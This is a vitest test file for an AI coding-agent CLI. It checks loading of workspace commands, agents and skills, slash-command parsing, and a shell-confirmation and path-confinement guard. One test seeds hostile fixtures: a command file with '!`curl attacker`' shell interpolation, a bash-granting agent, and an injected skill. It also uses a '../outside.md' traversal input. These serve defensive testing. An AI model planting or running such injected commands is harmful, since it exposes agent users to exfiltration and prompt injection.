import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { CommandDefinition, ToolCallPart } from "@keywork/engine";
import { afterEach, describe, expect, it } from "vitest";
import {
  commandRuntime,
  loadWorkspaceExtensions,
  resolveSlashCommand,
  slashCompleter,
} from "./commands.ts";

const cleanups: string[] = [];

afterEach(async () => {
  while (cleanups.length > 0) {
    const root = cleanups.pop();
    if (root !== undefined) await rm(root, { recursive: true, force: true });
  }
});

async function scratch(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "keywork-cli-ext-"));
  cleanups.push(root);
  return root;
}

async function seed(root: string, files: Record<string, string>): Promise<void> {
  for (const [relative, content] of Object.entries(files)) {
    const file = join(root, relative);
    await mkdir(join(file, ".."), { recursive: true });
    await writeFile(file, content, "utf8");
  }
}

function command(name: string, template = "body"): CommandDefinition {
  return { name, template, file: `${name}.md`, source: "project" };
}

describe("loadWorkspaceExtensions", () => {
  it("loads commands, agents, and skills from a trusted project", async () => {
    const cwd = await scratch();
    const userRoot = await scratch();
    await seed(cwd, {
      ".keywork/commands/ship.md": "---\ndescription: Ship the change\n---\nShip $ARGUMENTS",
      ".keywork/agents/scout.md": "---\ntools: [read]\n---\nScout prompt",
      ".claude/skills/deploy/SKILL.md": "---\ndescription: Deploy well\n---\nSteps.",
    });
    await seed(userRoot, { "commands/mine.md": "user command" });

    const extensions = await loadWorkspaceExtensions(cwd, true, userRoot);
    expect(extensions.commands.map((entry) => entry.name).sort()).toEqual(["mine", "ship"]);
    expect(extensions.agents.map((entry) => entry.name)).toEqual(["scout"]);
    expect(extensions.skills.map((entry) => entry.name)).toEqual(["deploy"]);
    expect(extensions.failures).toEqual([]);
  });

  it("loads nothing project-level from an untrusted directory", async () => {
    const cwd = await scratch();
    const userRoot = await scratch();
    await seed(cwd, {
      ".keywork/commands/evil.md": "!`curl attacker`",
      ".keywork/agents/evil.md": "---\nallow: [bash]\n---\nEvil",
      ".claude/skills/evil/SKILL.md": "Injected instructions.",
    });
    await seed(userRoot, { "commands/mine.md": "user command" });

    const extensions = await loadWorkspaceExtensions(cwd, false, userRoot);
    expect(extensions.commands.map((entry) => entry.name)).toEqual(["mine"]);
    expect(extensions.agents).toEqual([]);
    expect(extensions.skills).toEqual([]);
  });

  it("stays calm when nothing is defined anywhere", async () => {
    const cwd = await scratch();
    const userRoot = await scratch();
    const extensions = await loadWorkspaceExtensions(cwd, true, userRoot);
    expect(extensions).toEqual({ commands: [], agents: [], skills: [], failures: [] });
  });
});

describe("resolveSlashCommand", () => {
  const commands = [command("review"), command("ship")];

  it("resolves a command with its arguments", () => {
    expect(resolveSlashCommand(commands, "/review the diff  carefully")).toMatchObject({
      command: { name: "review" },
      args: "the diff carefully",
    });
  });

  it("resolves bare invocations with empty arguments", () => {
    expect(resolveSlashCommand(commands, "/ship")).toMatchObject({
      command: { name: "ship" },
      args: "",
    });
  });

  it("ignores unknown commands and plain prompts", () => {
    expect(resolveSlashCommand(commands, "/unknown")).toBeUndefined();
    expect(resolveSlashCommand(commands, "review this")).toBeUndefined();
    expect(resolveSlashCommand(commands, "/")).toBeUndefined();
  });
});

describe("slashCompleter", () => {
  const complete = slashCompleter(["session", "ship", "shave", "undo"]);

  it("completes slash prefixes", () => {
    expect(complete("/sh")).toEqual([["/shave", "/ship"], "/sh"]);
  });

  it("offers nothing once arguments begin or for plain text", () => {
    expect(complete("/ship now")).toEqual([[], "/ship now"]);
    expect(complete("hello")).toEqual([[], "hello"]);
  });
});

describe("commandRuntime", () => {
  it("routes shell interpolation through the guard and refuses when declined", async () => {
    const cwd = await scratch();
    const asked: ToolCallPart[] = [];
    const runtime = commandRuntime(cwd, {
      confirm: (call) => {
        asked.push(call);
        return Promise.resolve(false);
      },
    });
    await expect(runtime.runShell("echo pwned")).rejects.toThrow("shell interpolation declined");
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatchObject({ name: "bash", arguments: { command: "echo pwned" } });
  });

  it("executes approved commands through the bash tool", async () => {
    const cwd = await scratch();
    const runtime = commandRuntime(cwd, { confirm: () => Promise.resolve(true) });
    await expect(runtime.runShell("echo hello")).resolves.toContain("hello");
  });

  it("confines file embedding to the working directory", async () => {
    const cwd = await scratch();
    await seed(cwd, { "notes.md": "inside" });
    const runtime = commandRuntime(cwd, {});
    await expect(runtime.embedFile("notes.md")).resolves.toBe("inside");
    await expect(runtime.embedFile("../outside.md")).rejects.toThrow("escapes the project root");
  });
});
